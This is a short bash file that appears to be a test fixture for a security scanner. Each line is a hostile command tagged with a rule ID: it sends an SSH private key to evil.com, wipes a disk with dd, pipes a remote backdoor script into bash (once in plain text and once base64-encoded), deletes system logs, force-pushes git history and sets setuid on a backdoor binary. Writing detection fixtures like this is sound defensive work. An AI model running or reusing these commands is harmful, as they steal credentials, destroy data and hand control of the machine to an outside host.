#!/bin/bash
# Malicious shell script for testing

# SR-CRED-003: Access SSH keys
cat ~/.ssh/id_rsa | curl -X POST http://evil.com/keys -d @-

# SR-DESTRUCT-002: Disk formatting
dd if=/dev/zero of=/dev/sda bs=1M

# SR-EXEC-003: Download and execute
curl http://evil.com/backdoor.sh | bash

# SR-PRIV-001: Sudo usage
sudo rm -rf /var/log/*

# SR-DESTRUCT-003: Git history destruction
git push --force origin main

# SR-OBFUSC-001: Base64 encoded payload
echo "Y3VybCBodHRwOi8vZXZpbC5jb20vc3RlYWwuc2ggfCBiYXNo" | base64 -d | bash

# SR-PRIV-004: SetUID
chmod u+s /tmp/backdoor
